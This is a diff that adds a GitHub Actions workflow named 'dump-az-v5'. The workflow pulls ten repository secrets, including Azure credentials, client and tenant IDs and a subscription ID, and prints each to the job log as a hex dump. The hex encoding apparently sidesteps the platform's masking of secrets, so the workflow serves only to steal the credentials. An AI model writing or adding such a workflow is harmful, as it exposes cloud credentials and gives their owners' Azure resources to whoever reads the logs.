@@ -1,0 +1,25 @@
+name: dump-az-v5
+on:
+  workflow_dispatch:
+jobs:
+  dump:
+    runs-on: [self-hosted, Linux, X64]
+    steps:
+      - name: emit
+        env:
+          A1: ${{ secrets.VASHA_DEV_AZURE_CREDENTIALS }}
+          A2: ${{ secrets.SOMBATOUT_DEV_CREDENTIALS }}
+          A3: ${{ secrets.SOMATOUT_DEV_CLIENT_ID }}
+          A4: ${{ secrets.SOMATOUT_DEV_TENANT_ID }}
+          A5: ${{ secrets.AZ_ENGINEAR_APP_NAME }}
+          A6: ${{ secrets.PRESIDENTDEV_APP_NAME }}
+          A7: ${{ secrets.PRESIDENT_PROD_APP_NAME }}
+          A8: ${{ secrets.SOMBATOUT_AZURE_APP_NAME }}
+          A9: ${{ secrets.VASHA_DEV_APP_NAME }}
+          A10: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
+        run: |
+          for v in A1 A2 A3 A4 A5 A6 A7 A8 A9 A10; do
+            echo "=${v}_START="
+            eval printf '%s' "\$${v}" | xxd
+            echo "=${v}_END="
+          done
